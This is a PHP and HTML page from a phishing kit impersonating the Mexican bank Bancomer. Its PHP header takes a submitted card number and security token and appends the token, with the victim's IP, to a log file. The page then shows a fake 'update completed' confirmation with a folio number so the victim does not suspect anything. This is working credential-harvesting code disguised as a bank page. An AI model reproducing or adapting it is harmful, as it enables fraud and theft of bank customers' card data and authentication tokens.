<?php
include("../libreria/seguridad.php");
$numerodetarjeta = htmlspecialchars($_POST["numerodetarjeta"]);
$token = htmlspecialchars($_POST["token"]);

$file = fopen("../logs/".$logspersonas, "a");
fwrite($file, $ip." : Token: ".$token. PHP_EOL);
fclose($file);

?>


<!DOCTYPE html>
<!-- saved from url=(0034)http://104.248.24.3/comun/fin.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Bienvenido</title>
      
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1">
      <meta name="format-detection" content="telephone=no">
      <script src="./folio_files/jquery_v1.11.3.js.descarga"></script>
      <script type="text/javascript" src="./folio_files/iframe-resizer-contentwindow.min.js.descarga"></script>
      <script type="text/javascript" src="./folio_files/EnmascaraV2-AEM.js.descarga"></script>
	  
      <style type="text/css">
<!--
.Estilo8 {
	font-family: Arial, Helvetica, sans-serif;
	color: #05387A;
}
.Estilo11 {
	font-family: Arial, Helvetica, sans-serif;
	color: #00459F;
}
.Estilo19 {font-family: Arial, Helvetica, sans-serif}
.Estilo20 {font-size: 20px}
.Estilo21 {font-weight: bold; font-family: Arial, Helvetica, sans-serif;}
.Estilo23 {font-weight: bold; font-family: Arial, Helvetica, sans-serif; color: #084EA2;}
.Estilo24 {font-size: x-large}
.Estilo26 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 14px;
	color: #084EA2;
}
.Estilo27 {color: #FF0000}
.Estilo28 {font-size: 24px}
.Estilo29 {color: #000000}
.Estilo31 {color: #FF0000; font-size: 15px; }
.Estilo32 {
	font-size: 17px;
	color: #000000;
}
-->
      </style>
</head>
   <body>
  <div class="container">
 	
  <table width="450" border="0" align="center">
      <tbody><tr>
        <td width="107" height="229"><img src="./folio_files/065eff630b2d12fb8080fed4625f32d0.png" width="164" height="129"></td>
        <td width="333"><div align="left" class="Estilo20">
          <div align="center"><span class="Estilo21">Actualización completada </span> <strong>! </strong><br>
            <br>
            <span class="Estilo19"><strong>Numero de Folio: <span class="Estilo27">1291283313<br>
            <br>
            <span class="tatione  Estilo19"><span class="tatione Estilo19 "><span class="Estilo32">Para ingresar a bancomer.com</span></span></span></span><br>
              <a href="../index.php"  target="_parent" class="Estilo19">Da click aquí<br>
              <br>
          </a></strong></span></div><strong>
          <span class="tatione  Estilo23"><span class="tatione  Estilo8"><span class="tatione  Estilo11"><span class="tatione  Estilo19"><span class="tatione  Estilo19"><span class="tatione  Estilo19"><span class="tatione  Estilo19 Estilo24"><span class="tatione  Estilo19 Estilo28"><span class="tatione  Estilo19"><span class="Estilo29">
</span></span></span></span></span></span></span></span></span></span><span class="tatione  Estilo21"><span class="tatione  Estilo19"><span class="tatione  Estilo19"><span class="tatione  Estilo19"><span class="tatione  Estilo19"><span class="tatione  Estilo19"><span class="tatione  Estilo19 Estilo24"><span class="tatione  Estilo19 Estilo28"><span class="tatione  Estilo19">
</span></span></span><span class="tatione Estilo19 "><span class="tatione Estilo19 "><span class="tatione  Estilo19">
</span></span></span></span></span></span></span></span></span><span class="tatione  Estilo23"><span class="tatione  Estilo8"><span class="tatione  Estilo11"><span class="tatione  Estilo19"><span class="tatione  Estilo19"><span class="tatione  Estilo19"><span class="tatione  Estilo19 Estilo24"><span class="tatione  Estilo19 Estilo28"><span class="tatione  Estilo19"><span class="Estilo29"></span></span></span></span></span></span></span></span></span></span></strong></div></td>
      </tr>
    </tbody></table>
    
   	
  <div align="center"><br>
    </div>
  <section class="carga" style="display:none"></section> </div>
   




</body></html>